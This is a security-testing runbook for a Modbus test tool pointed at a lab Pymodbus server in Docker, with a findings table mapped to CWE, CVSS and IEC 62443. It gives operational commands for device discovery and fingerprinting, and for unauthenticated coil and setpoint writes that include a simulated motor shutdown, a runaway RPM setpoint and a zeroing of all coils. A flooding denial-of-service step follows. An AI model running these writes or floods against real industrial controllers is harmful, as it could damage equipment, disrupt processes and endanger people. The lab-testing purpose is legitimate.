# ModTester – Test Runbook
## Target: oitc/modbus-server (Docker / Pymodbus 3.12.1)
## Host: 192.168.159.128  |  Port: 5020  |  Date: 2026-02-25

---

## Confirmed Server State (from Docker logs)

| Register Type     | Address | Value  | Semantic (simulated)      |
|-------------------|---------|--------|---------------------------|
| Discrete Input    | 0       | True   | Sensor A active           |
| Discrete Input    | 1       | False  | Sensor B inactive         |
| Discrete Input    | 2       | True   | Sensor C active           |
| Discrete Input    | 3       | True   | Sensor D active           |
| Discrete Input    | 4       | False  | Sensor E inactive         |
| Discrete Input    | 5       | True   | Sensor F active           |
| Coil              | 0       | True   | Motor 1 ON                |
| Coil              | 1       | False  | Motor 2 OFF               |
| Coil              | 2       | True   | Valve A OPEN              |
| Coil              | 3       | False  | Valve B CLOSED            |
| Coil              | 4       | True   | Pump 1 ON                 |
| Coil              | 5       | False  | Pump 2 OFF                |
| Coil              | 6       | True   | Alarm relay ON            |
| Coil              | 7       | False  | Spare                     |
| Holding Register  | 0       | 1500   | Motor RPM setpoint        |
| Holding Register  | 1       | 3000   | Pressure setpoint (mbar)  |
| Holding Register  | 2       | 4500   | Flow setpoint (L/h)       |
| Holding Register  | 3       | 100    | Temperature limit (°C)    |
| Holding Register  | 4       | 200    | Speed limit               |
| Holding Register  | 5       | 75     | Duty cycle (%)            |
| Holding Register  | 8       | 9999   | Max alarm threshold       |
| Holding Register  | 9       | 12345  | Serial number             |
| Holding Register  | 12      | 60     | Timeout (s)               |
| Holding Register  | 14      | 3600   | Interval (s)              |
| Input Register    | 0       | 2350   | Current RPM (read-only)   |
| Input Register    | 1       | 1875   | Pressure reading          |
| Input Register    | 2       | 980    | Flow reading              |
| Input Register    | 3       | 42     | Temperature reading (°C)  |
| Input Register    | 4       | 65535  | Max counter (0xFFFF)      |
| Input Register    | 6       | 1024   | ADC channel 1             |
| Input Register    | 7       | 512    | ADC channel 2             |

**Device Identity (FC43 confirmed from logs):**
- VendorName: Pymodbus
- ProductCode: PM
- VendorUrl: https://github.com/pymodbus-dev/pymodbus/
- ProductName: Pymodbus Server
- ModelName: Pymodbus Server
- MajorMinorRevision: 3.12.1

---

## IMPORTANT: Port is 5020, not 502
All native ModTester modules use `RPORT`, MSF modules use `RPORT`.
Always set it explicitly — the default is 502 and will fail silently.

---

## PHASE 1 — Service Discovery

### 1a. Native: Check Modbus Protocol
```
ModTester > use modbus/scanner/discover
SMOD modbus(discover) > set RHOST 192.168.159.128
SMOD modbus(discover) > set RPORT 5020
SMOD modbus(discover) > exploit
```
**Expected:** Modbus TCP confirmed open on 5020

### 1b. Native: Port scan
```
ModTester > use modbus/scanner/portDiscover
SMOD modbus(portDiscover) > set RHOST 192.168.159.128
SMOD modbus(portDiscover) > set RPORT 5020
SMOD modbus(portDiscover) > exploit
```
**Expected:** Port 5020 open, TCP

### 1c. MSF: Modbus service detection
```
ModTester > use modbus/msf/modbusdetect
SMOD modbus(modbusdetect) > set RHOSTS 192.168.159.128
SMOD modbus(modbusdetect) > set RPORT 5020
SMOD modbus(modbusdetect) > exploit
```
**Expected:** `[+] Modbus service DETECTED on 192.168.159.128:5020`

**Standalone test:**
```bash
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module detect
```

### 1d. MSF: Device Fingerprinting (FC43)
```
ModTester > use modbus/msf/modbusBannerGrabbing
SMOD modbus(modbusBannerGrabbing) > set RHOSTS 192.168.159.128
SMOD modbus(modbusBannerGrabbing) > set RPORT 5020
SMOD modbus(modbusBannerGrabbing) > exploit
```
**Expected (confirmed from server logs):**
```
[+] Banner retrieved:
    VendorName               : Pymodbus
    ProductCode              : PM
    VendorUrl                : https://github.com/pymodbus-dev/pymodbus/
    ProductName              : Pymodbus Server
    ModelName                : Pymodbus Server
    MajorMinorRevision       : 3.12.1
```
> **Security Note:** FC43 exposes full device identity without authentication.
> In a real PLC this reveals vendor, firmware version, and model — valuable
> for targeted exploit selection. Maps to CWE-200 (Exposure of Sensitive Info).

---

## PHASE 2 — Unit ID Enumeration

### 2a. Native: Brute Force UID
```
ModTester > use modbus/scanner/uid
SMOD modbus(uid) > set RHOST 192.168.159.128
SMOD modbus(uid) > set RPORT 5020
SMOD modbus(uid) > exploit
```
**Expected:** UID 0xFF (255/broadcast) responds; UIDs 0-254 may all respond
since pymodbus accepts any unit ID by default.

### 2b. MSF: UID Scan (narrow range)
```
ModTester > use modbus/msf/modbusUIDScan
SMOD modbus(modbusUIDScan) > set RHOSTS 192.168.159.128
SMOD modbus(modbusUIDScan) > set RPORT 5020
SMOD modbus(modbusUIDScan) > set UNIT_ID_FROM 0
SMOD modbus(modbusUIDScan) > set UNIT_ID_TO 10
SMOD modbus(modbusUIDScan) > set BENICE 0
SMOD modbus(modbusUIDScan) > exploit
```
**Expected:** UIDs 0-10 all valid (pymodbus default: no unit ID filtering)

> **Security Note:** No Unit ID filtering = any attacker can address the device
> regardless of UID. Intended as a network segmentation mechanism, not a
> security control. Maps to CWE-284 (Improper Access Control).

---

## PHASE 3 — Register Read / Discovery

### 3a. Native: Coil Status (FC01)
```
ModTester > use modbus/scanner/coilDiscover
SMOD modbus(coilDiscover) > set RHOST 192.168.159.128
SMOD modbus(coilDiscover) > set RPORT 5020
SMOD modbus(coilDiscover) > exploit
```
**Expected:** Coils 0-7: True,False,True,False,True,False,True,False

### 3b. Native: Discrete Inputs (FC02)
```
ModTester > use modbus/scanner/discreteInputDiscover
SMOD modbus(discreteInputDiscover) > set RHOST 192.168.159.128
SMOD modbus(discreteInputDiscover) > set RPORT 5020
SMOD modbus(discreteInputDiscover) > exploit
```
**Expected:** Inputs 0-5: True,False,True,True,False,True

### 3c. Native: Holding Registers (FC03)
```
ModTester > use modbus/scanner/holdingRegisterDiscover
SMOD modbus(holdingRegisterDiscover) > set RHOST 192.168.159.128
SMOD modbus(holdingRegisterDiscover) > set RPORT 5020
SMOD modbus(holdingRegisterDiscover) > exploit
```
**Expected:** Regs 0-15: 1500, 3000, 4500, 100, 200, 75, 0, 1, 9999, 12345, 0, 0, 60, 50, 3600, 1

### 3d. Native: Input Registers (FC04)
```
ModTester > use modbus/scanner/inputRegisterDiscover
SMOD modbus(inputRegisterDiscover) > set RHOST 192.168.159.128
SMOD modbus(inputRegisterDiscover) > set RPORT 5020
SMOD modbus(inputRegisterDiscover) > exploit
```
**Expected:** Regs 0-7: 2350, 1875, 980, 42, 65535, 0, 1024, 512

### 3e. Native: Supported Function Code Enumeration
```
ModTester > use modbus/scanner/getfunc
SMOD modbus(getfunc) > set RHOST 192.168.159.128
SMOD modbus(getfunc) > set RPORT 5020
SMOD modbus(getfunc) > exploit
```
**Expected:** FC01, FC02, FC03, FC04, FC05, FC06, FC15, FC16, FC43

### 3f. MSF: Read Holding Registers (FC03) - all 16
```
ModTester > use modbus/msf/modbusClient
SMOD modbus(modbusClient) > set RHOSTS 192.168.159.128
SMOD modbus(modbusClient) > set RPORT 5020
SMOD modbus(modbusClient) > set ACTION READ_HOLDING_REGISTERS
SMOD modbus(modbusClient) > set UNIT_NUMBER 1
SMOD modbus(modbusClient) > set DATA_ADDRESS 0
SMOD modbus(modbusClient) > set NUMBER 16
SMOD modbus(modbusClient) > exploit
```

### 3g. MSF: Read Coils (FC01)
```
SMOD modbus(modbusClient) > set ACTION READ_COILS
SMOD modbus(modbusClient) > set NUMBER 8
SMOD modbus(modbusClient) > exploit
```

### 3h. MSF: Read Input Registers (FC04)
```
SMOD modbus(modbusClient) > set ACTION READ_INPUT_REGISTERS
SMOD modbus(modbusClient) > set DATA_ADDRESS 0
SMOD modbus(modbusClient) > set NUMBER 8
SMOD modbus(modbusClient) > exploit
```

---

## PHASE 4 — Write Operations (Core Security Findings)

> All writes succeed with NO authentication. This is the fundamental
> Modbus protocol vulnerability — by design, not implementation.

### 4a. Native DOS: Write Single Coil (unauthenticated)
```
ModTester > use modbus/dos/writeSingleCoils
SMOD modbus(writeSingleCoils) > set RHOST 192.168.159.128
SMOD modbus(writeSingleCoils) > set RPORT 5020
SMOD modbus(writeSingleCoils) > exploit
```

### 4b. Native DOS: Write Single Register (unauthenticated)
```
ModTester > use modbus/dos/writeSingleRegister
SMOD modbus(writeSingleRegister) > set RHOST 192.168.159.128
SMOD modbus(writeSingleRegister) > set RPORT 5020
SMOD modbus(writeSingleRegister) > exploit
```

### 4c. MSF: Flip Coil 0 OFF (Motor 1: ON -> OFF) — FC05
```
ModTester > use modbus/msf/modbusClient
SMOD modbus(modbusClient) > set RHOSTS 192.168.159.128
SMOD modbus(modbusClient) > set RPORT 5020
SMOD modbus(modbusClient) > set ACTION WRITE_COIL
SMOD modbus(modbusClient) > set UNIT_NUMBER 1
SMOD modbus(modbusClient) > set DATA_ADDRESS 0
SMOD modbus(modbusClient) > set DATA 0
SMOD modbus(modbusClient) > exploit
```
**Then verify the write:**
```
SMOD modbus(modbusClient) > set ACTION READ_COILS
SMOD modbus(modbusClient) > set NUMBER 4
SMOD modbus(modbusClient) > exploit
```
**Expected before:** 1 0 1 0  |  **Expected after:** 0 0 1 0
> Coil 0 flipped from True to False = simulated Motor 1 shutdown.
> CWE-306 | CVSS 9.1 Critical | IEC 62443 SR 2.1

### 4d. MSF: Inject out-of-range RPM setpoint — FC06
```
SMOD modbus(modbusClient) > set ACTION WRITE_REGISTER
SMOD modbus(modbusClient) > set DATA_ADDRESS 0
SMOD modbus(modbusClient) > set DATA 9999
SMOD modbus(modbusClient) > exploit
```
**Then verify:**
```
SMOD modbus(modbusClient) > set ACTION READ_HOLDING_REGISTERS
SMOD modbus(modbusClient) > set NUMBER 4
SMOD modbus(modbusClient) > exploit
```
**Expected before:** 1500 3000 4500 100  |  **Expected after:** 9999 3000 4500 100
> Holding register 0 (Motor RPM setpoint) changed from 1500 to 9999
> without authentication — simulated runaway setpoint injection.
> CWE-306 | CVSS 9.1 Critical | IEC 62443 SR 2.1

### 4e. MSF: Zero all coils — FC15 (mass shutdown simulation)
```
SMOD modbus(modbusClient) > set ACTION WRITE_COILS
SMOD modbus(modbusClient) > set DATA_ADDRESS 0
SMOD modbus(modbusClient) > set DATA_COILS 0,0,0,0,0,0,0,0
SMOD modbus(modbusClient) > exploit
```
**Then verify:**
```
SMOD modbus(modbusClient) > set ACTION READ_COILS
SMOD modbus(modbusClient) > set NUMBER 8
SMOD modbus(modbusClient) > exploit
```
**Expected after:** 0 0 0 0 0 0 0 0  (all motors/valves/pumps OFF)
> All 8 coils zeroed with a single unauthenticated FC15 command.
> CWE-306 | CVSS 9.1 Critical | IEC 62443 SR 2.1

### 4f. Native DOS: Write with specific UID
```
ModTester > use modbus/dos/writeSingleCoilsID
SMOD modbus(writeSingleCoilsID) > set RHOST 192.168.159.128
SMOD modbus(writeSingleCoilsID) > set RPORT 5020
SMOD modbus(writeSingleCoilsID) > exploit

ModTester > use modbus/dos/writeSingleRegisterID
SMOD modbus(writeSingleRegisterID) > set RHOST 192.168.159.128
SMOD modbus(writeSingleRegisterID) > set RPORT 5020
SMOD modbus(writeSingleRegisterID) > exploit
```

---

## PHASE 5 — Denial of Service (Run Last)

> WARNING: Run these last. Restart the container between tests.
> `docker kill <id> && docker run ...`

### 5a. Flooding Attack
```
ModTester > use modbus/dos/floodingAttack
SMOD modbus(floodingAttack) > set RHOST 192.168.159.128
SMOD modbus(floodingAttack) > set RPORT 5020
SMOD modbus(floodingAttack) > exploit
```
**Expected:** Server becomes unresponsive or drops connections.
> CWE-400 (Uncontrolled Resource Consumption) | CVSS 7.5 High

---

## MSF Standalone CLI — Quick Reference

```bash
# Full recon chain
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module recon --uid-from 0 --uid-to 10

# Individual modules
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module detect
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module banner
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module finduid --uid-from 0 --uid-to 20
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module client --action READ_HOLDING_REGISTERS --number 16
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module client --action READ_COILS --number 8
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module client --action WRITE_REGISTER --uid 1 --address 0 --data 9999
python2 System/Core/MetasploitBridge.py 192.168.159.128 --port 5020 --module client --action WRITE_COIL --uid 1 --address 0 --data 0
```

---

## Docker Server Management

```bash
# Restart server with rich config (after DOS tests or to reset state)
docker kill $(docker ps -q --filter ancestor=oitc/modbus-server)
docker run --network host --rm \
  -v $(pwd)/server_config.json:/server_config.json \
  oitc/modbus-server:latest -f /server_config.json

# Watch server logs in real time (separate terminal — invaluable during tests)
# The server prints every FC request received, showing exactly what ModTester sent
docker logs -f $(docker ps -q --filter ancestor=oitc/modbus-server)
```

---

## Findings Summary

| # | Phase | Tool | Finding | CWE | CVSS | IEC 62443 |
|---|-------|------|---------|-----|------|-----------|
| 1 | Discovery | modbusBannerGrabbing | Device identity exposed via FC43 without auth | CWE-200 | 5.3 Medium | SR 1.1 |
| 2 | Enumeration | modbusUIDScan / uid | No Unit ID filtering — any UID accepted | CWE-284 | 5.3 Medium | SR 2.1 |
| 3 | Read | coilDiscover / modbusClient | All process data readable without auth | CWE-306 | 7.5 High | SR 2.1 |
| 4 | Write | writeSingleCoils / WRITE_COIL | Coil state changed without auth (FC05) | CWE-306 | 9.1 Critical | SR 2.1 |
| 5 | Write | writeSingleRegister / WRITE_REGISTER | Process setpoint injected without auth (FC06) | CWE-306 | 9.1 Critical | SR 2.1 |
| 6 | Write | WRITE_COILS | All coils zeroed with single FC15 (mass shutdown) | CWE-306 | 9.1 Critical | SR 2.1 |
| 7 | DoS | floodingAttack | Server unresponsive under flood (no rate limiting) | CWE-400 | 7.5 High | SR 7.2 |

---

## Troubleshooting

**MSF bridge produces no output:**
MSF first-run setup wizard is blocking non-interactive execution.
Fix — run once interactively:
```bash
msfconsole -q
# wait for msf > prompt, then:
msf > exit
# Now the bridge runs silently
```

**Native modules use RHOST, MSF modules use RHOSTS:**
Always run `show options` first to confirm the exact option name.

**Write verified but server shows old value:**
The Docker server has no persistence by default — state is in memory.
Check server logs: `docker logs -f <container>` shows every request received.

**Want to reset register state between tests:**
Restart the Docker container — all registers reinitialise from server_config.json.